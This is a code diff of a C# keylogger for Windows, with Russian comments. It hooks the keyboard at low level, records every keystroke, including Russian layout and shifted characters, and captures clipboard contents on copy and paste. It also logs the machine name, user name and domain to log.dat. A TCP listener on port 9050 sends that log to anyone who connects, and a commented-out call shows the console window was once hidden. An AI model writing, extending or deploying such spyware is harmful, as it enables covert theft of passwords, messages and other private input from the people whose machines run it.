@@ -37,36 +37,114 @@ namespace ConsoleApp2
         public static string mss;
         public static int myi = 0;
 
+
+
+        static Dictionary<char, char> dictionaryRusEng = new Dictionary<char, char>();
+        static Dictionary<char, char> dictionaryDigits = new Dictionary<char, char>();
+
         [STAThread]
         static void Main(string[] args)
         {
             var handle = GetConsoleWindow();
 
             // Hide
-            ShowWindow(handle, SW_HIDE);
+            //ShowWindow(handle, SW_HIDE);
+            ShowWindow(handle, 1);
+            dictionaryRusEng.Add('Q', 'Й');
+            dictionaryRusEng.Add('W', 'Ц');
+            dictionaryRusEng.Add('E', 'У');
+            dictionaryRusEng.Add('R', 'К');
+            dictionaryRusEng.Add('T', 'Е');
+            dictionaryRusEng.Add('Y', 'Н');
+            dictionaryRusEng.Add('U', 'Г');
+            dictionaryRusEng.Add('I', 'Ш');
+            dictionaryRusEng.Add('O', 'Щ');
+            dictionaryRusEng.Add('P', 'З');
+            dictionaryRusEng.Add('[', 'Х');
+            dictionaryRusEng.Add(']', 'Ъ');
+            dictionaryRusEng.Add('A', 'Ф');
+            dictionaryRusEng.Add('S', 'Ы');
+            dictionaryRusEng.Add('D', 'В');
+            dictionaryRusEng.Add('F', 'А');
+            dictionaryRusEng.Add('G', 'П');
+            dictionaryRusEng.Add('H', 'Р');
+            dictionaryRusEng.Add('J', 'О');
+            dictionaryRusEng.Add('K', 'Л');
+            dictionaryRusEng.Add('L', 'Д');
+            dictionaryRusEng.Add(';', 'Ж');
+            dictionaryRusEng.Add('\'', 'Э');
+            dictionaryRusEng.Add('Z', 'Я');
+            dictionaryRusEng.Add('X', 'Ч');
+            dictionaryRusEng.Add('C', 'С');
+            dictionaryRusEng.Add('V', 'М');
+            dictionaryRusEng.Add('B', 'И');
+            dictionaryRusEng.Add('N', 'Т');
+            dictionaryRusEng.Add('M', 'Ь');
+            dictionaryRusEng.Add(',', 'Б');
+            dictionaryRusEng.Add('.', 'Ю');
+            dictionaryRusEng.Add('`', 'Ё');
+
+
+            dictionaryDigits.Add('1', '!');
+            dictionaryDigits.Add('2', '@');
+            dictionaryDigits.Add('3', '#');
+            dictionaryDigits.Add('4', '$');
+            dictionaryDigits.Add('5', '%');
+            dictionaryDigits.Add('6', '^');
+            dictionaryDigits.Add('7', '&');
+            dictionaryDigits.Add('8', '*');
+            dictionaryDigits.Add('9', '(');
+            dictionaryDigits.Add('0', ')');
+            dictionaryDigits.Add('`', '~');
+            dictionaryDigits.Add('-', '_');
+            dictionaryDigits.Add('=', '+');
+
+
 
 
             _hookID = SetHook(_proc);
             // получаем переменные окружения и данные о пользователе
 
-            Writer(Encrypt("CurrentDirectory: {0}" + Environment.CurrentDirectory + "\n", "Key"));
-            Writer(Encrypt("MachineName: {0}" + Environment.MachineName + "\n", "Key"));
-            Writer(Encrypt("OSVersion: {0}" + Environment.OSVersion.ToString() + "\n", "Key"));
-            Writer(Encrypt("SystemDirectory: {0}" + Environment.SystemDirectory + "\n", "Key"));
-            Writer(Encrypt("UserDomainName: {0}" + Environment.UserDomainName + "\n", "Key"));
-            Writer(Encrypt("UserInteractive: {0}" + Environment.UserInteractive + "\n", "Key"));
-            Writer(Encrypt("UserName: {0}" + Environment.UserName + "\n", "Key"));
+            /* Writer(Encrypt("CurrentDirectory: {0}" + Environment.CurrentDirectory + "\n", "Key"));
+             Writer(Encrypt("MachineName: {0}" + Environment.MachineName + "\n", "Key"));
+             Writer(Encrypt("OSVersion: {0}" + Environment.OSVersion.ToString() + "\n", "Key"));
+             Writer(Encrypt("SystemDirectory: {0}" + Environment.SystemDirectory + "\n", "Key"));
+             Writer(Encrypt("UserDomainName: {0}" + Environment.UserDomainName + "\n", "Key"));
+             Writer(Encrypt("UserInteractive: {0}" + Environment.UserInteractive + "\n", "Key"));
+             Writer(Encrypt("UserName: {0}" + Environment.UserName + "\n", "Key"));
+
+             */
+
+            Writer("\n========================================\n\nCurrentDirectory: {0}" + Environment.CurrentDirectory + "\n");
+            Writer("MachineName: {0}" + Environment.MachineName + "\n");
+            Writer("OSVersion: {0}" + Environment.OSVersion.ToString() + "\n");
+            Writer("SystemDirectory: {0}" + Environment.SystemDirectory + "\n");
+            Writer("UserDomainName: {0}" + Environment.UserDomainName + "\n");
+            Writer("UserInteractive: {0}" + Environment.UserInteractive + "\n");
+            Writer("UserName: {0}" + Environment.UserName + "\n");
+
+
+            //  Writer(Decrypt(Encrypt("CurrentDirectory: {0}" + Environment.CurrentDirectory + "\n", "Key"), "Key"));
+
+            //Writer(Decrypt(Encrypt("MachineName: {0}" + Environment.MachineName + "\n", "Key"), "Key"));
+            //   Writer(Encrypt("OSVersion: {0}" + Environment.OSVersion.ToString() + "\n", "Key"));
+            // Writer(Encrypt("SystemDirectory: {0}" + Environment.SystemDirectory + "\n", "Key"));
+            // Writer(Encrypt("UserDomainName: {0}" + Environment.UserDomainName + "\n", "Key"));
+            //  Writer(Encrypt("UserInteractive: {0}" + Environment.UserInteractive + "\n", "Key"));
+            //Writer(Encrypt("UserName: {0}" + Environment.UserName + "\n", "Key"));
 
             // получаем буфер обмена при запуске
             string htmlData = GetBuff();
-            Console.WriteLine("Clipboard: {0}", htmlData);
+            //     Console.WriteLine("Clipboard: {0}\n", htmlData);
 
             // получаем текущую раскладку клавиатуры
 
             ushort lang = GetKeyboardLayout();
+            //    Console.WriteLine("kl {0}",lang);
             mss = lang.ToString();
-            Console.WriteLine("Первоначальная раскладка: {0}\n", mss);
-            Writer(Encrypt("Первоначальная раскладка: " + mss + "\n", "Key"));
+            //  Console.WriteLine("Первоначальная раскладка: {0}\n", lang.ToString());
+            // Writer(Encrypt("Первоначальная раскладка: " + mss + "\n", "Key"));
+            Writer("original keyboard layout: " + mss + "\n");
             Thread mtr = new System.Threading.Thread(ServerSocket);
             mtr.Start();
             Application.Run();
@@ -87,7 +165,7 @@ namespace ConsoleApp2
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
-        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        private static IntPtr HookCallback(int nCode,IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0)
             {
@@ -99,6 +177,12 @@ namespace ConsoleApp2
                 string original = mystring;
                 string encrypted;
 
+               
+                bool capsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
+                bool sh = Control.ModifierKeys != Keys.Shift;
+                
+             //   if (original.Length==1 && !capsLock) { original = original.ToLower(); }
+               // if (original.Length==1 && !sh){ original = original.ToLower(); }
                 // запрашиваем раскладку клавиатуры для каждого символа
 
 
@@ -108,93 +192,171 @@ namespace ConsoleApp2
                 if (mss == mss_check) { }
                 else
                 {
-                    Console.WriteLine("Смена раскладки: {0}", mss_check);
+                    //    Console.WriteLine("Смена раскладки: {0}", mss_check);
                     encrypted = Encrypt("\n<Смена раскладки:" + mss_check + " >\n", "Key");
-
-                    Writer(encrypted);
+                    Writer("\n\t< Смена раскладки: " + mss_check + " >\n");
+                    //      Writer(encrypted);
                     mss = mss_check;
                 }
 
                 if (wParam == (IntPtr)WM_KEYDOWN)   //пишем все клавиши подряд
                 {
-                    Writer(Encrypt(original, "Key"));
+                    if (GetKeyboardLayout() == 1049 && original.Length==1)
+                    {
+                        original = Russian(original[0]);
+                    }
 
+                    if (original.Length==1 && capsLock && char.IsLetter(original[0])) {
+                      
+                         original = ChangeRegister(original[0]);
+                    }
+                    if (original.Length==1 && sh && char.IsLetter(original[0]))
+                    { 
+                        original = ChangeRegister(original[0]); 
+                    }
+
+                    if (original.Length == 1 && !sh && (char.IsDigit(original[0]) || original[0] == '`' || original[0] == '-' || original[0] == '='))
+                    {
+                        original = DigitToSym(original[0]);
+                    }
+
+                    //Writer(Encrypt(original, "Key"));
+                  // if(original.Length==1)
+                    Writer(original);
+                    
                 }
 
                 if (wParam == (IntPtr)WM_KEYUP) // пишем только те что были отпущены (в нашем случае все контрольные)
                 {
-                    if (Keys.LControlKey == (Keys)vkCode) { Writer(Encrypt(original, "Key")); } // если был отпущен = запись
-                    if (Keys.LShiftKey == (Keys)vkCode) { Writer(Encrypt(original, "Key")); } // если был отпущен = запись
+                    if (Keys.LControlKey == (Keys)vkCode)
+                    {
+                     //   Writer("<"+original+">");
+                        //Writer(Encrypt(original, "Key")); 
+                    } // если был отпущен = запись
+                    if (Keys.LShiftKey == (Keys)vkCode)
+                    {
+                      //  Writer("<"+original+">");
+                        //Writer(Encrypt(original, "Key")); 
+                    } // если был отпущен = запись
+
+                    if(Keys.Space == (Keys)vkCode)
+                    {
+                        Writer(" ");
+                    }
+                    if (Keys.Enter == (Keys)vkCode)
+                    {
+                        Writer("\n");
+                    }
+                    if (Keys.Tab == (Keys)vkCode)
+                    {
+                        Writer("\t");
+                    }
+
+                    if (Keys.Back == (Keys)vkCode)
+                    {
+                        Writer("<backspace>");
+                    }
+
+                    if(Keys.OemOpenBrackets == (Keys)vkCode)
+                    {
+                        Writer("[");
+                    }
+
+                    if(Keys.OemOpenBrackets == (Keys)vkCode && Keys.Shift == Control.ModifierKeys)
+                    {
+                        Writer("{");
+                    }
+
+                    if (Keys.OemCloseBrackets == (Keys)vkCode)
+                    {
+                        Writer("]");
+                    }
+
+                    if (Keys.OemCloseBrackets == (Keys)vkCode && Keys.Shift == Control.ModifierKeys)
+                    {
+                        Writer("}");
+                    }
+
                 }
 
                 // ловим сочетание клавиш CTRL+C (копирование в буфер)
                 if (Keys.C == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                 {
 
-                    Console.WriteLine("CTRL+C: {0}", (Keys)vkCode);
+                    //     Console.WriteLine("CTRL+C: {0}", (Keys)vkCode);
 
                     string htmlData1 = GetBuff();                                                   // получаем буфер
-                    Writer(Encrypt("Содержимое буфера: " + htmlData1 + "\n", "Key"));                  // записываем буфер
-                    Console.WriteLine("Clipboard: {0}", htmlData1);
+                    Writer("\n\t<COPY>\n");
+                    Writer("Содержимое буфера: " + htmlData1 + "\n");                  // записываем буфер
+                                                                                       //  Writer(Encrypt("Содержимое буфера: " + htmlData1 + "\n", "Key"));                  // записываем буфер
+                                                                                       //  Console.WriteLine("Clipboard: {0}", htmlData1);
 
                     encrypted = Encrypt("\n<COPY>\n", "Key");
-                    Writer(encrypted);
+
+                    //  Writer(encrypted);
                 }
 
                 else if (Keys.V == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                 {
 
                     //return (IntPtr)1; // вроде как блокировка нажатия работает, проверил
-                    Console.WriteLine("CTRL+V: {0}", (Keys)vkCode);
-                    encrypted = Encrypt("\n<PASTE>\n", "Key");
-                    Writer(encrypted);
-
+                    //    Console.WriteLine("CTRL+V: {0}", (Keys)vkCode);
+                    encrypted = Encrypt("\n\t<PASTE>\n", "Key");
+                    // Writer(encrypted);
+                    Writer("\n\t<PASTE> \n");
+                    Writer("Содержимое буфера: " + GetBuff().ToString() + "\n");
                 }
                 else if (Keys.Z == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                 {
 
-                    Console.WriteLine("CTRL+Z: {0}", (Keys)vkCode);
-                    encrypted = Encrypt("\n<Отмена>\n", "Key");
-                    Writer(encrypted);
+                    //   Console.WriteLine("CTRL+Z: {0}", (Keys)vkCode);
+                    encrypted = Encrypt("\n\t<CANCEL>\n", "Key");
+                    //  Writer(encrypted);
+                    Writer("\n\t<CANCEL>\n");
                 }
                 else if (Keys.F == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                 {
 
-                    Console.WriteLine("CTRL+F: {0}", (Keys)vkCode);
-                    encrypted = Encrypt("\n<Искать>\n", "Key");
-                    Writer(encrypted);
+                    //Console.WriteLine("CTRL+F: {0}", (Keys)vkCode);
+                    encrypted = Encrypt("\n\t<SEARCH>\n", "Key");
+                    //Writer(encrypted);
+                    Writer("\n\t<SEARCH>\n");
                 }
                 else if (Keys.A == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                 {
 
-                    Console.WriteLine("CTRL+A: {0}", (Keys)vkCode);
-                    encrypted = Encrypt("\n<Выделить всё>\n", "Key");
-                    Writer(encrypted);
+                    //Console.WriteLine("CTRL+A: {0}", (Keys)vkCode);
+                    encrypted = Encrypt("\n\t<SELECT ALL>\n", "Key");
+                    //
+                    //Writer(encrypted);
+                    Writer("\n\t<SELECT ALL>\n");
                 }
                 else if (Keys.N == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                 {
 
-                    Console.WriteLine("CTRL+N: {0}", (Keys)vkCode);
-                    encrypted = Encrypt("\n<Новый>\n", "Key");
-                    Writer(encrypted);
+          
+                    encrypted = Encrypt("\t<NEW>\n", "Key");
+                    //Writer(encrypted);
+                    Writer("\n\t<NEW>\n");
                 }
                 else if (Keys.T == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                 {
-
-                    Console.WriteLine("CTRL+T: {0}", (Keys)vkCode);
-                    encrypted = Encrypt("\n<Нов.вкладка>\n", "Key");
-                    Writer(encrypted);
+                    
+                    encrypted = Encrypt("\t<CTRL+T>\n", "Key");
+                    Writer("\n\t<CTRL T>\n");
+                    // Writer(encrypted);
 
                 }
                 else if (Keys.X == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                 {
 
-                    Console.WriteLine("CTRL+X: {0}", (Keys)vkCode);
-                    encrypted = Encrypt("\n<Вырезать>\n", "Key");
-                    Writer(encrypted);
+                    
+                    encrypted = Encrypt("\n\t<CUT>\n", "Key");
+                    //Writer(encrypted);
+                    Writer("\n\t<CUT>\n");
                 }
 
-                Console.WriteLine("Original:   {0}", original);
+            //    Console.WriteLine("Original:   {0}", original);
 
             }
 
@@ -205,53 +367,12 @@ namespace ConsoleApp2
 
         public static string GetBuff()
         {
-            string htmlData = Clipboard.GetText(TextDataFormat.Text);
+            string htmlData = Clipboard.GetText(TextDataFormat.UnicodeText);
             return htmlData;
         }
 
 
-        public static void ServerSocket()
-        {
-            while (true)
-            {
-                {
-                    try
-                    {
-                        IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
-                        Socket newsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                        newsock.Bind(ipep);
-                        newsock.Listen(10);
-                        Console.WriteLine("Waiting for a client...");
-                        Socket client = newsock.Accept();
-                        IPEndPoint clientep = (IPEndPoint)client.RemoteEndPoint;
-                        Console.WriteLine("Connected with {0} at port {1}", clientep.Address, clientep.Port);
-                        // FileInfo fi = new FileInfo(Application.StartupPath + @"\log.dat");
-                        // string fsize= fi.Length.ToString();
-                        try
-                        {
 
-                            client.SendFile(Application.StartupPath + @"\log.dat");
-                            Console.WriteLine("Disconnected from {0}", clientep.Address);
-                            client.Close();
-                            newsock.Close();
-
-                        }
-                        catch (Exception ex)
-                        {
-                            Console.Write(ex.Message);
-                        }
-                    }
-
-                    catch (Exception e)
-                    {
-                        Console.Write(e.Message);
-                    }
-
-
-                }
-            }
-
-        }
 
 
         // Записываем шифрованный текст в файл
@@ -260,8 +381,8 @@ namespace ConsoleApp2
         {
 
             StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.dat", true);
-
-            sw.WriteLine(inputstring);
+            Console.WriteLine(inputstring);
+            sw.Write(inputstring);
             sw.Flush();
             sw.Close();
 
@@ -305,6 +426,59 @@ namespace ConsoleApp2
             symmetricKey.Clear();
             return Convert.ToBase64String(cipherTextBytes);
         }
+
+
+
+
+        public static string Decrypt(string encryptedText, string password, string salt = "Key", string hashAlgorithm = "SHA1", int passwordIterations = 2, string initialVector = "OFRna73m*aze01xY", int keySize = 256)
+        {
+            if (string.IsNullOrEmpty(encryptedText))
+                return "";
+            byte[] initialVectorBytes = Encoding.ASCII.GetBytes(initialVector);
+            byte[] saltValueBytes = Encoding.ASCII.GetBytes(salt);
+            byte[] encryptedTextBytes = Encoding.UTF8.GetBytes(encryptedText);
+
+            PasswordDeriveBytes derivedPassword = new PasswordDeriveBytes
+            (password, saltValueBytes, hashAlgorithm, passwordIterations);
+
+            byte[] keyBytes = derivedPassword.GetBytes(keySize / 8);
+            RijndaelManaged symmetricKey = new RijndaelManaged();
+            symmetricKey.Mode = CipherMode.CBC;
+
+            byte[] decryptedTextBytes = null;
+
+            using (ICryptoTransform decryptor = symmetricKey.CreateDecryptor
+           (keyBytes, initialVectorBytes))
+            {
+                using (MemoryStream memStream = new MemoryStream())
+                {
+                    using (CryptoStream cryptoStream = new CryptoStream
+                            (memStream, decryptor, CryptoStreamMode.Write))
+                    {
+                        cryptoStream.Write(encryptedTextBytes, 0, encryptedTextBytes.Length);
+                        ////////////////////////////////
+                        ///
+                        cryptoStream.FlushFinalBlock();
+                        ///
+                        /////////////////////////////////
+                        decryptedTextBytes = memStream.ToArray();
+                        memStream.Close();
+                        cryptoStream.Close();
+                    }
+                }
+            }
+            symmetricKey.Clear();
+            return Convert.ToBase64String(decryptedTextBytes);
+        }
+
+
+
+
+
+        ///////////////////////////////////////////////////////////////////
+        ////////////////////////////библиотеки/////////////////////////////
+        ///////////////////////////////////////////////////////////////////
+
 
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
@@ -357,5 +531,82 @@ namespace ConsoleApp2
             return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
         }
 
+
+
+
+
+        public static string Russian(char sym)
+        {
+            if (char.IsLetter(sym))
+            {
+                return dictionaryRusEng[sym].ToString();
+            }
+            return sym.ToString();
+        }
+
+
+        public static string ChangeRegister(char  sym)
+        {
+            if (char.IsLower(sym))
+            {
+                return char.ToUpper(sym).ToString();
+            }
+            else if (char.IsUpper(sym))
+            {
+                return char.ToLower(sym).ToString();
+            }
+            return sym.ToString();
+        }
+
+
+        public static string DigitToSym(char sym)
+        {
+            return dictionaryDigits[sym].ToString();
+        }
+
+
+
+        public static void ServerSocket()
+        {
+            while (true)
+            {
+                {
+                    try
+                    {
+                        IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
+                        Socket newsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                        newsock.Bind(ipep);
+                        newsock.Listen(10);
+                        Console.WriteLine("Waiting for a client...");
+                        Socket client = newsock.Accept();
+                        IPEndPoint clientep = (IPEndPoint)client.RemoteEndPoint;
+                        Console.WriteLine("Connected with {0} at port {1}", clientep.Address, clientep.Port);
+                        // FileInfo fi = new FileInfo(Application.StartupPath + @"\log.dat");
+                        // string fsize= fi.Length.ToString();
+                        try
+                        {
+
+                            client.SendFile(Application.StartupPath + @"\log.dat");
+                            Console.WriteLine("Disconnected from {0}", clientep.Address);
+                            client.Close();
+                            newsock.Close();
+
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.Write(ex.Message);
+                        }
+                    }
+
+                    catch (Exception e)
+                    {
+                        Console.Write(e.Message);
+                    }
+
+
+                }
+            }
+
+        }
     }
 }
